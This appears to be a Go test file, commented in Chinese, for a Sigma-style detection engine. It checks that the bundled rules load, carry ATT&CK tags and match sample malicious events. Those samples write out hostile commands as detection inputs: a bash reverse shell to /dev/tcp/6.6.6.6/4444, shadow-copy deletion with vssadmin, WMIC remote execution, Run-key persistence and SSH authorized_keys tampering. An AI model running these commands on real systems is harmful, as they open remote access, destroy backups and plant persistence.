package sigma

import "testing"

// 仓库自带的规则必须全部可加载——规则改坏了要在测试里炸，而不是上线后静默跳过。
func TestRepoRulesAllLoad(t *testing.T) {
	engine, report := LoadDirReport("../../../rules")
	if report.Total == 0 {
		t.Fatal("没找到规则目录")
	}
	if report.Loaded != report.Total {
		t.Fatalf("有规则被跳过：%v", report.Skipped)
	}

	// 抽查两条新规则真的能命中
	hits := engine.Evaluate(1007, "linux", map[string]any{
		"process": map[string]any{"cmd_line": "bash -i >& /dev/tcp/6.6.6.6/4444 0>&1"},
	})
	if !containsStr(ruleIDs(hits), "6742a2ee-b09c-4eb9-a040-1be583da8332") {
		t.Errorf("反弹 shell 命令未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(4003, "", map[string]any{
		"query": map[string]any{"hostname": "tcp.ngrok.io"},
	})
	if !containsStr(ruleIDs(hits), "bae25b03-2a0e-44f0-a36d-fe0042b9e66f") {
		t.Errorf("隧道服务 DNS 查询未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(1001, "linux", map[string]any{
		"activity_id": 3,
		"file":        map[string]any{"path": "/root/.ssh/authorized_keys"},
	})
	if !containsStr(ruleIDs(hits), "5a7c1d9e-3b64-4f28-a0d5-8e9f2c4b6a17") {
		t.Errorf("敏感文件变更未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(201002, "windows", map[string]any{
		"activity_id": 1,
		"reg_key":     map[string]any{"path": `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil`},
		"reg_value":   map[string]any{"data": `C:\Users\x\evil.exe`},
	})
	if !containsStr(ruleIDs(hits), "7b3f2c8a-1d5e-4a96-b0c4-9e8d6f2a5c31") {
		t.Errorf("注册表持久化未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(3002, "linux", map[string]any{
		"activity_id": 1, "status_id": 2,
		"user":         map[string]any{"name": "root"},
		"src_endpoint": map[string]any{"ip": "10.9.8.7"},
	})
	if !containsStr(ruleIDs(hits), "9c4e6b2d-8f13-47a5-9e07-3d5a8c1f6b42") {
		t.Errorf("登录失败未命中规则：%v", ruleIDs(hits))
	}
}

// 自带规则必须全部打了 ATT&CK 标签——矩阵里的空白应当反映真实缺口，
// 而不是有人忘了写 tags。
func TestRepoRulesAllTagged(t *testing.T) {
	engine, _ := LoadDirReport("../../../rules")
	for _, r := range engine.Rules() {
		if len(r.Tactics) == 0 {
			t.Errorf("规则 %s（%s）缺少 attack 战术标签", r.ID, r.Title)
		}
		if len(r.Techniques) == 0 {
			t.Errorf("规则 %s（%s）缺少 attack 技术标签", r.ID, r.Title)
		}
	}
}

// 新补的缺口规则要真能命中：勒索删卷影、横向远程执行、数据打包暂存。
func TestGapFillingRulesMatch(t *testing.T) {
	engine, _ := LoadDirReport("../../../rules")
	cases := []struct {
		name   string
		os     string
		cmd    string
		ruleID string
	}{
		{"删卷影", "windows", `vssadmin delete shadows /all /quiet`, "2cdb08a1-0247-424f-b2f4-492d10716e0e"},
		{"远程执行", "windows", `wmic /node:10.0.0.8 process call create "cmd /c evil.exe"`, "7cf2f54d-543f-433d-98f9-e6d7b51d0866"},
		{"数据打包", "linux", `tar czf /tmp/x.tar.gz /home/alice`, "be49049f-6ff2-4620-8ce1-6b6f833fe943"},
	}
	for _, c := range cases {
		hits := engine.Evaluate(1007, c.os, map[string]any{
			"process": map[string]any{"cmd_line": c.cmd},
		})
		if !containsStr(ruleIDs(hits), c.ruleID) {
			t.Errorf("%s 未命中：%v", c.name, ruleIDs(hits))
		}
	}
}
